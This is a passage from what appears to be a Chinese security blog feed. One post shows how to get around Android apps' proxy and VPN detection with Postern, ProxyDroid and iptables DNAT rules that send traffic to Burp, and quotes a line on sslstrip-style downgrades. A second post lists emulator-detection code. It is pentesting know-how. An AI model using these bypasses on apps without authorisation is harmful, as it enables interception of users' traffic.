title="3.代理与VPN"></a>3.代理与VPN</h2><h3 id="3-1、代理"><a href="#3-1、代理" class="headerlink" title="3.1、代理"></a>3.1、代理</h3><p><strong>代理（proxy）</strong> 也称网络代理，是一种特殊的网络服务，允许一个终端（一般为客户端）通过这个服务与另外一个终端（一般为服务器）进行非直接的连接。</p><p>一个<code>完整的代理请求过程</code>为：客户端首先根据代理服务器所使用的<strong>代理协议</strong>，与<strong>代理服务器</strong>创建连接，接着按照协议请求对目标服务器创建连接、或者获得目标服务器的指定资源。</p><h3 id="3-2、VPN"><a href="#3-2、VPN" class="headerlink" title="3.2、VPN"></a>3.2、VPN</h3><p><strong>VPN</strong>（virtual private network）（<strong>虚拟专用网络</strong> ）是常用于连接中、大型企业或团体间私人网络的通讯方法。它利用<strong>隧道协议（Tunneling Protocol）</strong>来达到发送端认证、消息保密与准确性等功能。</p><h3 id="3-3、代理和VPN的区别"><a href="#3-3、代理和VPN的区别" class="headerlink" title="3.3、代理和VPN的区别"></a>3.3、代理和VPN的区别</h3><p>从各自的定义，我们就能看出VPN的特点是采取<strong>隧道协议</strong>进行数据传输和保护；而代理使用的则是对应的<strong>代理协议</strong>。</p><p>下面是VPN和代理的常用协议：</p><table><thead><tr><th align="left"></th><th align="left">协议名称</th></tr></thead><tbody><tr><td align="left">VPN</td><td align="left">OpvenVPN、IPsec、IKEv2、PPTP、L2TP、WireGuard等</td></tr><tr><td align="left">代理</td><td align="left">HTTP、HTTPS、SOCKS、FTP、RTSP等</td></tr></tbody></table><p>VPN 协议大多是作用在 OSI 的第二层和第三层之间，所以使用 VPN 时，几乎能转发所有的流量。</p><p>而代理协议多作用在应用层，最高层。</p><h2 id="4-安卓代理检测"><a href="#4-安卓代理检测" class="headerlink" title="4.安卓代理检测"></a>4.安卓代理检测</h2><p>知道了代理与VPN的作用后，在APP中，如果开发人员在代码中添加了一些网络层的检测机制，而这些机制恰恰又是针对工作层协议进行的检测，那么只要分析出工作在IOS的哪一层，抢先一步在下层做出应对，那APP在上层无论怎么检测，都没有用。下面将对测试场景进行详细分析。</p><p>抓包的步骤：</p><p>1.在客户端（手机）中设置代理服务器的地址</p><p>2.开启代理服务器（burp）的代理功能</p><p>如果在客户端对代理服务进行过滤，禁止客户端通过代理服务器进行访问Internet，添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);</span><br></pre></td></tr></table></figure><p>官方对于<strong>Proxy.NO_PROXY</strong>的描述如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A proxy setting that represents a &#123;<span class="doctag">@code</span> DIRECT&#125; connection,</span></span><br><span class="line"><span class="comment"> * basically telling the protocol handler not to use any proxying.</span></span><br><span class="line"><span class="comment"> * Used, for instance, to create sockets bypassing any other global</span></span><br><span class="line"><span class="comment"> * proxy settings (like SOCKS):</span></span><br><span class="line"><span class="comment"> * &lt;P&gt;</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> Socket s = new Socket(Proxy.NO_PROXY);&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> Proxy NO_PROXY = <span class="keyword">new</span> Proxy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates the proxy that represents a &#123;@code DIRECT&#125; connection.private Proxy() &#123;</span></span><br><span class="line">    type = Type.DIRECT;</span><br><span class="line">    sa = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>NO_PROXY</strong>实际上就是type属性为<strong>DIRECT</strong>的一个Proxy对象，这个type有三种：</p><ul><li>DIRECT</li><li>HTTP</li><li>SOCKS</li></ul><p>所以，Proxy.NO_PROXY的意思是connection的请求是<strong>直连</strong>。</p><p>此时若通过系统进行代理，app对外请求会失效，也就是视觉上看到的卡死状态，就是不让走系统代理。</p><p>安卓手机上设置<strong>系统代理</strong>即是在【设置】-【WLAN】-【修改网络】手动设置代理。</p><p><strong>针对不走系统代理的情况有如下两种应对：</strong></p><p>1、使用基于<code>VPN</code>模式的<code>Postern</code></p><p>2、使用基于<code>iptables</code>的<code>ProxyDroid</code></p><p>对此，我做出了如下一些测试：</p><h3 id="4-1、使用系统代理"><a href="#4-1、使用系统代理" class="headerlink" title="4.1、使用系统代理"></a>4.1、使用系统代理</h3><p> APP关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    InputStream in = connection.getInputStream();</span><br><span class="line"></span><br><span class="line">                    reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        response.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    showResponse(response.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (reader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            reader.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (connection != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        connection.disconnect();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>针对<strong>Proxy.NO_PROXY</strong>，先测试一下，系统代理是否真的不能抓包。</p><p>如下图先设置系统代理，burp监听8888，此时打开APP，点击发送请求无任何反应，burp中也抓不到包，说明系统代理被禁了。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512144301.png" alt="image-20220512144301004"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512162425.png" alt="image-20220512162425216"></p><h3 id="4-2、使用Postern代理"><a href="#4-2、使用Postern代理" class="headerlink" title="4.2、使用Postern代理"></a>4.2、使用Postern代理</h3><p>用过这款软件的都知道，当开启代理服务后状态栏会有个<code>钥匙</code>的标志，这可能也是基于VPN模式工作的特征</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512162635.png" alt="image-20220512162635792"></p><p>同样的APP，点击请求，此时成功绕过了Proxy.NO_PROXY检测！也说明了VPN协议在HTTP协议的下层。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512163122.png" alt="image-20220512163121953"></p><h2 id="5-安卓VPN检测"><a href="#5-安卓VPN检测" class="headerlink" title="5.安卓VPN检测"></a>5.安卓VPN检测</h2><p>VPN也是代理的一种，但是由于通讯协议的差异，所以检测代码也不一样。</p><p>当客户端运行<code>VPN虚拟隧道协议</code>时，会在当前节点<code>创建</code>基于eth之上的<code>tun0</code>接口或<code>ppp0</code>接口，所以一旦出现带有明显特征的网络接口名称，就可以认定是使用了VPN协议进行通信。</p><p>下面这段代码的检测方式：出现特征<strong>tun0</strong>或者<strong>ppp0</strong>则退出应用，也就是我们看到的闪退效果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">isDeviceInVPN</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">        <span class="keyword">while</span> (networkInterfaces.hasMoreElements()) &#123;</span><br><span class="line">            String name = networkInterfaces.nextElement().getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;tun0&quot;</span>) || name.equals(<span class="string">&quot;ppp0&quot;</span>)) &#123;</span><br><span class="line">                stop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在点击监听中放置isDeviceInVPN()功能，点击即触发，如果检测到了使用了VPN则直接退出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (view.getId() == R.id.send_request)&#123;</span><br><span class="line">        isDeviceInVPN();</span><br><span class="line">        sendRequestWithHttpURLConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1、使用ProxyDroid代理"><a href="#5-1、使用ProxyDroid代理" class="headerlink" title="5.1、使用ProxyDroid代理"></a>5.1、使用ProxyDroid代理</h3><p>当前场景：APP同时开启了代理检测以及VPN检测</p><p>这时使用<strong>iptables</strong>进行数据转发的软件 <strong>ProxyDroid</strong> 进行测试，配置如下图所示：</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512164343.png" alt="image-20220512164343437"></p><p>开启之后，系统状态栏不会出现钥匙的形状，这时再次进行抓包测试。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512164629.png" alt="image-20220512164629075"></p><p>burp成功获取到了请求，至此代理与VPN的应对方法均已实现。所以，<strong>iptables</strong> 竟然能从OSI的 2、3层下面走吗，下面我们继续分析。</p><h2 id="6-iptables原理"><a href="#6-iptables原理" class="headerlink" title="6.iptables原理"></a>6.iptables原理</h2><p>我们都知道安卓使用的是linux内核，而linux内核提供的防火墙工具是<strong>Netfilter/Iptables</strong>。</p><p><strong>Netfilter</strong>是由linux内核集成的IP数据包过滤系统，其工作在内核内部，而<strong>Iptables</strong>则是让用户定义规则集的表结构。</p><p>也就是，<strong>iptables</strong>是一个命令行工具，位于用户空间，它真正操作的框架实现在<strong>内核</strong>当中。</p><blockquote><p>Netfilter是一个数据包处理模块，它具有<code>网络地址转换</code>、<code>数据包内容修改</code>、<code>数据包过滤</code>等功能。 要使netfilter能够工作，就需要将所有的规则读入内存中。netfilter自己维护一个内存块，在此内存块中有4个表：filter表、NAT表、mangle表和raw表。在每个表中有相应的链，链中存放的是一条条的规则，规则就是过滤防火的语句或者其他功能的语句。也就是说表是链的容器，链是规则的容器。实际上，每个链都只是一个hook函数（钩子函数）而已。</p></blockquote><p><strong>Iptables</strong>主要工作在OSI七层的2.3.4层，好像也没比VPN的工作协议低，反而还有高的，但是测试结果证明，是我想错了，iptables不是由于协议低，而是没有出现<strong>tun0</strong>或者<strong>ppp0</strong>这两个关键的网卡特征，所以成功绕过了VPN的检测。</p><p>基于iptables这个流量转发，我还发现了一个新的名词，叫做“<code>透明代理</code>”，iptables的转发模式就是这种。</p><p>由此，延伸了一个新的代理模式，通过burp进行“透明代理”，网上的教程错综复杂，亲测使用过程如下。</p><h2 id="7-透明代理"><a href="#7-透明代理" class="headerlink" title="7.透明代理"></a>7.透明代理</h2><ul><li>原理：透明代理技术可以让客户端<code>感觉不到代理的存在</code>，用户不需要在浏览器中设置任何代理，只需设置缺省网关即可。在访问外部网络时，客户端的数据包被发送到缺省网关，通过缺省网关的路由，最终到达代理服务器，最后代理服务器运行代理进程，数据实际被重定向到代理服务器的代理端口，即由本地代理服务器向外请求所需数据然后拷贝给客户端。</li></ul><p>接下来我将尝试：结合安卓端的透明代理技术与burp存在的invisible模式</p><h3 id="7-1、使用Burp透明代理"><a href="#7-1、使用Burp透明代理" class="headerlink" title="7.1、使用Burp透明代理"></a>7.1、使用Burp透明代理</h3><h4 id="（1）安卓端设置"><a href="#（1）安卓端设置" class="headerlink" title="（1）安卓端设置"></a>（1）安卓端设置</h4><p>首先在设备上手动进行设置：将所以请求80、443端口的tcp流量进行nat转发到192.168.50.177（burp的监听地址）的对应端口上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to  192.168.50.177:80</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to  192.168.50.177:443</span><br></pre></td></tr></table></figure><p>查看当前规则是否成功添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512174024.png" alt="image-20220512174024798"></p><h4 id="（2）代理服务器端设置"><a href="#（2）代理服务器端设置" class="headerlink" title="（2）代理服务器端设置"></a>（2）代理服务器端设置</h4><p>添加80和443的端口监听</p><p>在【Binding】中设置端口，选中 【All interfaces】</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220511155619.png" alt="image-20220511155619470"></p><p>并对【Request handing】做出如下设置</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220511155224.png"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220511155347.png"></p><blockquote><p><strong>Redirect to port</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。</p><p><strong>Force use of SSL</strong> - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。</p></blockquote><p>设置之后，Proxy状态如下</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220511155443.png" alt="Image"></p><p>此时burp就可对转发到这里的80和443端口的流量进行<strong>透明代理</strong></p><blockquote><p>注意：如果出现443端口被占用，查找进程kill掉即可。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20220511154711616.png" alt="image-20220511154711616"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20220511154455104.png" alt="image-20220511154455104"></p><p>以管理员身份运行 cmd 执行如下代码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20220511154419965.png" alt="image-20220511154419965"></p></blockquote><p>经过测试，burp成功抓取到了请求包。</p><p><strong>这里不禁思考，如果是基于iptables进行的数据转发，那么刚才的ProxyDroid是否也内置了一些路由规则呢？</strong></p><p>查看一下开启ProxyDroid时iptables当下的规则</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/20220512175635.png" alt="image-20220512175635716"></p><p>从图中可以看到共有六条策略，其中最后两条就是我们刚才手动添加的，但并没有看到burp监听的8888端口，8123、8124一定是软件内置的代理转发端口，想要知道具体原理还需要详细分析ProxyDroid的源码。</p><p><strong>血泪避坑</strong>：网上出现了很多教程，最关键的iptables规则写法不一，导致多次测试结果并不成功，如果将安卓终端的80和443端口同时转发到burp上监听的唯一一个端口则会出现连接错误。根据burp官方文档说明为每个端口号设置监听器会更加稳定，也就是要设置两个代理监听。</p><h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h2><p>根据不同的代码检测，也会有不同的应对方法，所以，遇到APP出现抓包闪退等问题，先逆向，查看源码，在通信处仔细进行分析，再针对检测代码进行绕过，才是正解。本文提到的并不是固定的处理方法，如果文章有叙述不当，尽请矫正。</p><h2 id="9-参考链接"><a href="#9-参考链接" class="headerlink" title="9.参考链接"></a>9.参考链接</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/proxy/options/invisible">burp invisible官方文档</a></p><p><a href="https://mp.weixin.qq.com/s/u4WwEGFADvRIYFudrMDsRQ">代理与VPN</a></p><p><a href="https://cloud.tencent.com/developer/article/1619659">iptables的内核原理</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模拟器检测机制</title>
      <link href="2023/11/28/%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/"/>
      <url>2023/11/28/%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="传统的检测方法"><a href="#传统的检测方法" class="headerlink" title="传统的检测方法"></a>传统的检测方法</h2><p>传统的检测方法主要是对模拟器的IMSI、IDS、默认文件等几个方面进行检测。</p><h3 id="默认号码"><a href="#默认号码" class="headerlink" title="默认号码"></a>默认号码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private static String[] known_numbers &#x3D; &#123;&quot;15555215554&quot;, &quot;15555215556&quot;,</span><br><span class="line">            &quot;15555215558&quot;, &quot;15555215560&quot;, &quot;15555215562&quot;, &quot;15555215564&quot;,</span><br><span class="line">            &quot;15555215566&quot;, &quot;15555215568&quot;, &quot;15555215570&quot;, &quot;15555215572&quot;,</span><br><span class="line">            &quot;15555215574&quot;, &quot;15555215576&quot;, &quot;15555215578&quot;, &quot;15555215580&quot;,</span><br><span class="line">            &quot;15555215582&quot;, &quot;15555215584&quot;&#125;;</span><br></pre></td></tr></table></figure><h3 id="默认ID"><a href="#默认ID" class="headerlink" title="默认ID"></a>默认ID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static String[] known_device_ids &#x3D; &#123;&quot;000000000000000&quot;&#125;;</span><br></pre></td></tr></table></figure><h3 id="默认IMSI"><a href="#默认IMSI" class="headerlink" title="默认IMSI"></a>默认IMSI</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static String[] known_imsi_ids &#x3D; &#123;&quot;310260000000000&quot;&#125;;</span><br></pre></td></tr></table></figure><h3 id="默认文件路径"><a href="#默认文件路径" class="headerlink" title="默认文件路径"></a>默认文件路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static String[] known_files &#x3D; &#123;</span><br><span class="line">            &quot;&#x2F;system&#x2F;lib&#x2F;libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">            &quot;&#x2F;sys&#x2F;qemu_trace&quot;,</span><br><span class="line">            &quot;&#x2F;system&#x2F;bin&#x2F;qemu-props&quot;&#125;;</span><br></pre></td></tr></table></figure><p>这些特征一旦是吻合的，说明是模拟器设备，但是现在很多模拟器都可以改变这些值来逃避检测，所以仅仅依靠这些检测方式不太行了</p><h2 id="基于模拟器cpu信息的检测"><a href="#基于模拟器cpu信息的检测" class="headerlink" title="基于模拟器cpu信息的检测"></a>基于模拟器cpu信息的检测</h2><p>cpu信息检测主要是在cpu信息看看是否包含intel、amd等字段，很多模拟器目前对于cpu信息还无法进行模拟</p><p>读取cpu信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public static String readCpuInfo() &#123;</span><br><span class="line">       String result &#x3D; &quot;&quot;;</span><br><span class="line">       try &#123;</span><br><span class="line">           String[] args &#x3D; &#123;&quot;&#x2F;system&#x2F;bin&#x2F;cat&quot;, &quot;&#x2F;proc&#x2F;cpuinfo&quot;&#125;;</span><br><span class="line">           ProcessBuilder cmd &#x3D; new ProcessBuilder(args);</span><br><span class="line"></span><br><span class="line">           Process process &#x3D; cmd.start();</span><br><span class="line">           StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">           String readLine &#x3D; &quot;&quot;;</span><br><span class="line">           BufferedReader responseReader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;utf-8&quot;));</span><br><span class="line">           while ((readLine &#x3D; responseReader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">               sb.append(readLine);</span><br><span class="line">           &#125;</span><br><span class="line">           responseReader.close();</span><br><span class="line">           result &#x3D; sb.toString().toLowerCase();</span><br><span class="line">       &#125; catch (IOException ex) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>进行判定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cpuInfo &#x3D; readCpuInfo();</span><br><span class="line">if ((cpuInfo.contains(&quot;intel&quot;) || cpuInfo.contains(&quot;amd&quot;))) &#123;return true;&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] blockList &#x3D; &quot;google_sdk,sdk,sdk_x86,vbox86p&quot;.split(&quot;,&quot;);</span><br></pre></td></tr></table></figure><h2 id="关键路径检测特定模拟器检测"><a href="#关键路径检测特定模拟器检测" class="headerlink" title="关键路径检测特定模拟器检测"></a>关键路径检测特定模拟器检测</h2><p>bluestacks成功躲避了前两种检测方法</p><p>所以针对它给出一些bluestacks的关键路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private static String[] known_bluestacks &#x3D; &#123;&quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.appmart-1.apk&quot;, &quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.BstCommandProcessor-1.apk&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.help-1.apk&quot;, &quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.home-1.apk&quot;, &quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.s2p-1.apk&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;app&#x2F;com.bluestacks.searchapp-1.apk&quot;, &quot;&#x2F;data&#x2F;bluestacks.prop&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.androVM.vmconfig&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.accelerometerui&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.appfinder&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.appmart&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.appsettings&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.BstCommandProcessor&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.bstfolder&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.help&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.home&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.s2p&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.searchapp&quot;,</span><br><span class="line">           &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.settings&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.setup&quot;, &quot;&#x2F;data&#x2F;data&#x2F;com.bluestacks.spotlight&quot;, &quot;&#x2F;mnt&#x2F;prebundledapps&#x2F;bluestacks.prop.orig&quot;</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure><p>检测方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static boolean checkBlueStacksFiles() &#123;</span><br><span class="line">        for (int i &#x3D; 0; i &lt; known_bluestacks.length; i++) &#123;</span><br><span class="line">            String file_name &#x3D; known_bluestacks[i];</span><br><span class="line">            File qemu_file &#x3D; new File(file_name);</span><br><span class="line">            if (qemu_file.exists()) &#123;</span><br><span class="line">                FkLog.e(&quot;Result : Find BlueStacks Files!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        FkLog.e(&quot;Result : Not Find BlueStacks Files!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="其他检测"><a href="#其他检测" class="headerlink" title="其他检测"></a>其他检测</h2><ul><li>检查手机IMEI等一系列编号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm &#x3D; (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);  </span><br><span class="line">  String deviceid &#x3D; tm.getDeviceId();&#x2F;&#x2F;获取IMEI号  </span><br><span class="line">  String te1  &#x3D; tm.getLine1Number();&#x2F;&#x2F;获取本机号码  </span><br><span class="line">  String imei &#x3D; tm.getSimSerialNumber();&#x2F;&#x2F;获得SIM卡的序号  </span><br><span class="line">  String imsi &#x3D; tm.getSubscriberId();&#x2F;&#x2F;得到用户Id </span><br></pre></td></tr></table></figure><ul><li>读取手机品牌信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">android.os.Build.BRAND,</span><br><span 